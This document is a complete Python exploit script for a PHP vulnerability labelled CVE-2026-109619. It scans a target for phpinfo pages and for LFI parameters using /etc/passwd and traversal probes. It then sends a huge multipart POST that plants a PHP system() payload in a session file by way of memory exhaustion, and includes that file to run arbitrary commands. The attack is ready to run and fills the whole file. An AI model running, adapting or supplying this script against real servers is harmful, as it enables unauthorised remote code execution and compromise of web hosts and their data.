#!/usr/bin/env python3
"""
CVE-2026-109619 — PHP Session Upload Progress OOM → LFI → RCE

Phase 0  Recon   — fingerprint server, detect PHP version, find phpinfo,
                   discover LFI vectors, auto-calibrate payload
Phase 1  OOM     — multipart POST with PHP code in filename → OOM →
                   session file preserved on disk
Phase 2  LFI     — include session file via discovered LFI vector → RCE
"""
import argparse, os, re, socket, ssl, sys, threading, time, urllib.parse

# ── defaults ───────────────────────────────────────────
DEFAULT_PORTS = {"http": 80, "https": 443}
COMMON_PHP_PAGES = [
    "/index.php", "/", "/wp-login.php", "/wp-admin/", "/admin/",
    "/login.php", "/info.php", "/test.php", "/default.php",
]
COMMON_LFI_PARAMS = ["file", "page", "include", "path", "doc", "lang", "template", "view"]
COMMON_LFI_PAGES = [
    "/reader.php", "/index.php", "/page.php", "/view.php",
    "/download.php", "/include.php", "/template.php", "/load.php",
]
COMMON_PHPINFO = ["/phpinfo.php", "/info.php", "/php_info.php", "/test.php", "/i.php"]
SESSION_PATHS = [
    "/var/lib/php/sessions",
    "/var/lib/php/session",
    "/tmp",
]


def parse_args():
    p = argparse.ArgumentParser(
        description="CVE-2026-109619 OOM + LFI → RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("-u", "--host", default=os.environ.get("TARGET_HOST", "127.0.0.1"))
    p.add_argument("-p", "--port", type=int, default=int(os.environ.get("TARGET_PORT", "443")))
    p.add_argument("--cmd", default=os.environ.get("CMD", "id"))
    p.add_argument("--sid", default="exploit002")
    p.add_argument("--session-path", default=None, help="override session save path")
    p.add_argument("--lfi-url", default=None, help="known LFI url, e.g. /reader.php?file=")
    p.add_argument("--post-url", default=None, help="PHP page to POST to")
    p.add_argument("--oom-mb", type=int, default=None, help="OOM payload size in MB (auto if omitted)")
    p.add_argument("--scan-only", action="store_true", help="only run recon, don't exploit")
    p.add_argument("--no-scan", action="store_true", help="skip recon, use provided values")
    return p.parse_args()


# ── HTTP helpers ───────────────────────────────────────
class HTTP:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.use_tls = port == 443

    def request(self, method, path, body=None, bnd=None, cookie=None,
                headers_extra=None, timeout=120):
        hdr = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\n"
        if cookie:
            hdr += f"Cookie: {cookie}\r\n"
        if headers_extra:
            for k, v in headers_extra.items():
                hdr += f"{k}: {v}\r\n"
        if body and bnd:
            hdr += f"Content-Type: multipart/form-data; boundary={bnd.decode()}\r\n"
            hdr += f"Content-Length: {len(body)}\r\n"
        elif body:
            hdr += f"Content-Length: {len(body)}\r\n"
        hdr += "Connection: close\r\n\r\n"

        raw = socket.create_connection((self.host, self.port), timeout=30)
        if self.use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(raw, server_hostname=self.host)
        else:
            sock = raw
        sock.settimeout(timeout)

        data = bytearray()
        def rx():
            try:
                while True:
                    c = sock.recv(65536)
                    if not c:
                        break
                    data.extend(c)
            except Exception:
                pass
        t = threading.Thread(target=rx, daemon=True)
        t.start()
        try:
            sock.sendall(hdr.encode())
            if body:
                for off in range(0, len(body), 262144):
                    sock.sendall(body[off:off + 262144])
        except (BrokenPipeError, ConnectionResetError, ssl.SSLError, OSError):
            pass
        t.join(timeout=timeout + 1)
        sock.close()
        return bytes(data)

    def get(self, path, **kw):
        return self.request("GET", path, **kw)

    def post(self, path, body, bnd, **kw):
        return self.request("POST", path, body=body, bnd=bnd, **kw)


def status_code(raw):
    if not raw:
        return 0
    m = re.match(rb"HTTP/\d\.\d (\d+)", raw)
    return int(m.group(1)) if m else 0

def status_line(raw):
    if not raw:
        return "(no response)"
    return raw.split(b"\r\n", 1)[0].decode("latin1", errors="replace")

def resp_headers(raw):
    if b"\r\n\r\n" not in raw:
        return {}
    hdr_block = raw.split(b"\r\n\r\n", 1)[0].decode("latin1", errors="replace")
    result = {}
    for line in hdr_block.split("\r\n")[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            result[k.strip().lower()] = v.strip()
    return result

def resp_body(raw):
    return raw.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in raw else raw

def multipart(parts, bnd):
    buf = bytearray()
    for p in parts:
        nm = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        dt = p["data"].encode() if isinstance(p["data"], str) else p["data"]
        buf += b"--" + bnd + b"\r\n"
        buf += b'Content-Disposition: form-data; name="' + nm + b'"'
        if "filename" in p:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            buf += b'; filename="' + fn + b'"'
            buf += b"\r\nContent-Type: application/octet-stream"
        buf += b"\r\n\r\n" + dt + b"\r\n"
    buf += b"--" + bnd + b"--\r\n"
    return bytes(buf)


# ── Phase 0: Recon ─────────────────────────────────────
def recon(http, args):
    info = {
        "server": None,
        "php_version": None,
        "os_hint": None,
        "memory_limit": None,
        "post_max_size": None,
        "session_path": None,
        "upload_progress": None,
        "use_only_cookies": None,
        "php_page": None,
        "lfi_vector": None,
    }

    print("\n" + "─" * 62)
    print(" Phase 0: Recon")
    print("─" * 62)

    # ── server fingerprint ──
    print("\n[0.1] server fingerprint")
    r = http.get("/", timeout=10)
    code = status_code(r)
    hdrs = resp_headers(r)

    srv = hdrs.get("server", "")
    php = hdrs.get("x-powered-by", "")
    info["server"] = srv or "(not disclosed)"
    if php:
        info["php_version"] = php
    if "ubuntu" in srv.lower() or "debian" in srv.lower():
        info["os_hint"] = "Debian/Ubuntu"
    elif "centos" in srv.lower() or "red hat" in srv.lower() or "el" in srv.lower():
        info["os_hint"] = "CentOS/RHEL"

    print(f"      Server: {info['server']}")
    print(f"      PHP:    {info['php_version'] or '(not in headers)'}")
    if info["os_hint"]:
        print(f"      OS:     {info['os_hint']}")

    # ── phpinfo detection ──
    print("\n[0.2] phpinfo detection")
    for path in COMMON_PHPINFO:
        try:
            r = http.get(path, timeout=8)
            if status_code(r) == 200:
                body = resp_body(r).decode("latin1", errors="replace")
                if "phpinfo()" in body or "PHP Version" in body:
                    print(f"      ✓ found: {path}")
                    parse_phpinfo(body, info)
                    break
        except Exception:
            continue
    else:
        print("      ✗ no phpinfo page found")

    # ── find valid PHP page ──
    print("\n[0.3] find PHP endpoint for POST")
    if args.post_url:
        info["php_page"] = args.post_url
        print(f"      using: {args.post_url} (user-specified)")
    else:
        for path in COMMON_PHP_PAGES:
            try:
                r = http.get(path, timeout=8)
                c = status_code(r)
                if c in (200, 301, 302, 403):
                    h = resp_headers(r)
                    if "x-powered-by" in h or c == 200:
                        info["php_page"] = path
                        print(f"      ✓ found: {path} ({c})")
                        break
            except Exception:
                continue
        if not info["php_page"]:
            info["php_page"] = "/index.php"
            print(f"      ? fallback: /index.php")

    # ── LFI discovery ──
    print("\n[0.4] LFI vector discovery")
    if args.lfi_url:
        info["lfi_vector"] = args.lfi_url
        print(f"      using: {args.lfi_url} (user-specified)")
    else:
        lfi_found = discover_lfi(http, info)
        if not lfi_found:
            print("      ✗ no LFI vector found automatically")
            print("        use --lfi-url to specify one")

    # ── session path ──
    if args.session_path:
        info["session_path"] = args.session_path
    elif not info["session_path"]:
        if info["os_hint"] == "Debian/Ubuntu":
            info["session_path"] = "/var/lib/php/sessions"
        elif info["os_hint"] == "CentOS/RHEL":
            info["session_path"] = "/var/lib/php/session"
        else:
            info["session_path"] = "/var/lib/php/sessions"

    # ── summary ──
    print("\n" + "─" * 62)
    print(" Recon summary")
    print("─" * 62)
    print(f"  Server:          {info['server']}")
    print(f"  PHP:             {info['php_version'] or 'unknown'}")
    print(f"  OS:              {info['os_hint'] or 'unknown'}")
    print(f"  memory_limit:    {info['memory_limit'] or 'unknown'}")
    print(f"  post_max_size:   {info['post_max_size'] or 'unknown'}")
    print(f"  session path:    {info['session_path']}")
    print(f"  upload_progress: {info['upload_progress'] or 'unknown'}")
    print(f"  use_only_cookies:{info['use_only_cookies'] or 'unknown'}")
    print(f"  POST target:     {info['php_page']}")
    print(f"  LFI vector:      {info['lfi_vector'] or 'NOT FOUND'}")

    # ── feasibility check ──
    ml = parse_size(info["memory_limit"]) if info["memory_limit"] else None
    ps = parse_size(info["post_max_size"]) if info["post_max_size"] else None
    if ml and ps:
        if ps >= ml:
            print(f"\n  ✓ OOM feasible: post_max_size({info['post_max_size']}) ≥ memory_limit({info['memory_limit']})")
        else:
            print(f"\n  ✗ OOM blocked: post_max_size({info['post_max_size']}) < memory_limit({info['memory_limit']})")
    if info["upload_progress"] and info["upload_progress"].lower() == "off":
        print("  ✗ session.upload_progress.enabled = Off")

    return info


def parse_phpinfo(body, info):
    patterns = {
        "memory_limit": r"memory_limit.*?<td[^>]*>(\d+\w*)</td>",
        "post_max_size": r"post_max_size.*?<td[^>]*>(\d+\w*)</td>",
        "upload_progress": r"session\.upload_progress\.enabled.*?<td[^>]*>(On|Off)</td>",
        "use_only_cookies": r"session\.use_only_cookies.*?<td[^>]*>(On|Off|\d)</td>",
    }
    for key, pat in patterns.items():
        m = re.search(pat, body, re.DOTALL | re.IGNORECASE)
        if m:
            info[key] = m.group(1)
            print(f"      {key} = {m.group(1)}")

    m = re.search(r"session\.save_path.*?<td[^>]*>([^<]+)</td>", body, re.DOTALL)
    if m:
        val = m.group(1).strip()
        if val and val != "no value" and val != "<i>no value</i>":
            info["session_path"] = val
            print(f"      session.save_path = {val}")

    m = re.search(r"PHP Version\s+(\d+\.\d+\.\d+)", body)
    if m:
        info["php_version"] = f"PHP/{m.group(1)}"
        print(f"      PHP version = {m.group(1)}")

    m = re.search(r"System\s*</td><td[^>]*>([^<]+)</td>", body, re.DOTALL)
    if m:
        sysinfo = m.group(1).strip()
        if "ubuntu" in sysinfo.lower() or "debian" in sysinfo.lower():
            info["os_hint"] = "Debian/Ubuntu"
        elif "centos" in sysinfo.lower() or "red hat" in sysinfo.lower():
            info["os_hint"] = "CentOS/RHEL"
        else:
            info["os_hint"] = sysinfo[:60]
        print(f"      OS = {info['os_hint']}")


def discover_lfi(http, info):
    canary = "/etc/passwd"
    for page in COMMON_LFI_PAGES:
        for param in COMMON_LFI_PARAMS:
            url = f"{page}?{param}={canary}"
            try:
                r = http.get(url, timeout=6)
                body = resp_body(r).decode("latin1", errors="replace")
                if "root:" in body and "/bin/" in body:
                    info["lfi_vector"] = f"{page}?{param}="
                    print(f"      ✓ LFI confirmed: {page}?{param}= (etc/passwd readable)")
                    return True
            except Exception:
                continue
    for page in COMMON_LFI_PAGES:
        for param in COMMON_LFI_PARAMS:
            traversal = "....//....//....//....//....//etc/passwd"
            url = f"{page}?{param}={traversal}"
            try:
                r = http.get(url, timeout=6)
                body = resp_body(r).decode("latin1", errors="replace")
                if "root:" in body and "/bin/" in body:
                    info["lfi_vector"] = f"{page}?{param}=....//....//....//....//..../"
                    print(f"      ✓ LFI confirmed (traversal): {page}?{param}=")
                    return True
            except Exception:
                continue
    return False


def parse_size(val):
    if not val:
        return None
    val = val.strip().upper()
    m = re.match(r"(\d+)\s*(K|M|G)?", val)
    if not m:
        return None
    n = int(m.group(1))
    unit = m.group(2) or ""
    if unit == "K":
        return n * 1024
    elif unit == "M":
        return n * 1024 * 1024
    elif unit == "G":
        return n * 1024 * 1024 * 1024
    return n


# ── Phase 1 & 2: Exploit ──────────────────────────────
def exploit(http, args, info):
    sess_path = info["session_path"]
    sess_file = f"{sess_path}/sess_{args.sid}"
    php_code = f"<?php system('{args.cmd}');die(); ?>"

    # auto-calculate OOM payload
    if args.oom_mb:
        oom_bytes = args.oom_mb * 1024 * 1024
    else:
        ml = parse_size(info["memory_limit"]) if info["memory_limit"] else None
        if ml:
            oom_bytes = ml + (4 * 1024 * 1024)
        else:
            oom_bytes = 140 * 1024 * 1024
    oom_mb = oom_bytes / (1024 * 1024)

    print("\n" + "─" * 62)
    print(" Phase 1: OOM trigger")
    print("─" * 62)
    print(f"  SID:      {args.sid}")
    print(f"  Session:  {sess_file}")
    print(f"  Payload:  {php_code}")
    print(f"  OOM size: {oom_mb:.0f} MB")
    print(f"  POST to:  {info['php_page']}")

    half = oom_bytes // 2
    body = multipart([
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": "pwn"},
        {"name": "f", "filename": php_code, "data": b"A" * 64},
        {"name": "pad1", "data": b"B" * half},
        {"name": "pad2", "data": b"C" * half},
    ], b"BOOM")
    print(f"  Body:     {len(body) / (1024*1024):.1f} MB")
    print(f"  Sending ...", flush=True)

    r1 = http.post(info["php_page"], body, b"BOOM",
                    cookie=f"PHPSESSID={args.sid}", timeout=180)
    code = status_code(r1)
    print(f"  Response: {status_line(r1)}")

    if code == 500 or len(r1) == 0:
        print("  ✓ OOM triggered")
    else:
        print(f"  ✗ OOM not triggered (got {code})")
        print("    check: post_max_size ≥ memory_limit ?")
        return

    time.sleep(0.5)

    # ── Phase 2: LFI ──
    print("\n" + "─" * 62)
    print(" Phase 2: LFI → RCE")
    print("─" * 62)

    if not info["lfi_vector"]:
        print("  ✗ no LFI vector — cannot trigger inclusion")
        print(f"    session file should be at: {sess_file}")
        print("    use --lfi-url to specify a known LFI endpoint")
        return

    lfi_url = info["lfi_vector"] + sess_file
    print(f"  LFI:      {lfi_url}")

    r2 = http.get(lfi_url, timeout=10)
    out = resp_body(r2).decode("latin1", errors="replace")
    print(f"  Response: {status_line(r2)}")

    # ── try other session paths if first fails ──
    if "uid=" not in out and not args.session_path:
        for alt_path in SESSION_PATHS:
            if alt_path == sess_path:
                continue
            alt_file = f"{alt_path}/sess_{args.sid}"
            alt_url = info["lfi_vector"] + alt_file
            print(f"  Trying:   {alt_url}")
            r2 = http.get(alt_url, timeout=10)
            out = resp_body(r2).decode("latin1", errors="replace")
            if "uid=" in out:
                sess_file = alt_file
                break

    # ── result ──
    print("\n" + "═" * 62)
    if "uid=" in out:
        idx = out.index("uid=")
        end = out.find("\n", idx)
        line = out[idx:end].strip() if end > 0 else out[idx:idx + 80].strip()
        print(f"  ★  RCE confirmed: {line}")
        print(f"  ★  Session: {sess_file}")
        print(f"  ★  Chain: OOM → session preserved → LFI include → RCE")
    elif out.strip():
        print(f"  ?  response ({len(out)} chars):")
        print(f"     {out[:500]}")
    else:
        print("  ✗  no output — session file may not exist at expected path")
        print(f"     tried: {sess_file}")
    print("═" * 62)


# ── main ───────────────────────────────────────────────
def main():
    args = parse_args()
    http = HTTP(args.host, args.port)
    scheme = "https" if http.use_tls else "http"

    print("═" * 62)
    print("  CVE-2026-109619  php2shell  (OOM + LFI → RCE)")
    print(f"  Target: {scheme}://{args.host}:{args.port}")
    print(f"  CMD:    {args.cmd}")
    print("═" * 62)

    if args.no_scan:
        info = {
            "server": None, "php_version": None, "os_hint": None,
            "memory_limit": None, "post_max_size": None,
            "session_path": args.session_path or "/var/lib/php/sessions",
            "upload_progress": None, "use_only_cookies": None,
            "php_page": args.post_url or "/index.php",
            "lfi_vector": args.lfi_url,
        }
    else:
        info = recon(http, args)

    if args.scan_only:
        print("\n  (--scan-only: stopping before exploit)")
        return

    if not info["lfi_vector"]:
        print("\n  ⚠  no LFI vector found or specified")
        resp = input("  Continue anyway? OOM will fire but RCE needs LFI. [y/N] ")
        if resp.lower() != "y":
            return

    exploit(http, args, info)


if __name__ == "__main__":
    main()
